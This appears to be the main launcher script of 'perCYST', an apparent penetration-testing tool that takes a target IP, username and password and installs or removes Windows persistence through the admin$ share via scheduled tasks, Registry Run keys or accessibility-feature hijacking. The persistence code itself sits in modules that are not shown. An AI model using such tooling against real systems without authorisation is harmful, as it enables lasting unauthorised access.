from modules import *
import getpass

# Authors: Kirk Hayes (l0gan) & Steve Laura

def ascii():
    print('perCYST\n\n<INSERT ASCII ART HERE>\n\n')

if __name__ == "__main__":
    ascii()
    #ip = ""
    ip = raw_input("[!] Enter Host IP Address: ")
    #username = ""
    username = raw_input("[!] Enter Username: ")
    #passwd = ""
    passwd = getpass.getpass(prompt="[!] Enter Password: ")
    share = "admin$"
    print("Modules:\n  1. Scheduled Task\n  2. Registry Run\n  3. Accessibility Features\n")
    module = raw_input("[!] Which module to run?: ")
    if module == "1":
        module = SchedTask.SchedTask(ip, username, passwd, share)
    elif module == "2":
        module = RegRun.RegRun(ip, username, passwd, share)
    elif module == "3":
        module = AccessibilityFeat.AccessibilityFeat(ip, username, passwd, share)
    while True:
        c = raw_input("[!] Set or Cleanup?: ")
        if c.lower() == "set":
            module.setPercyst()
            break
        elif str(c.lower()) == "cleanup":
            module.cleanup()
            break
        else:
            print("[-] Invalid Choice")
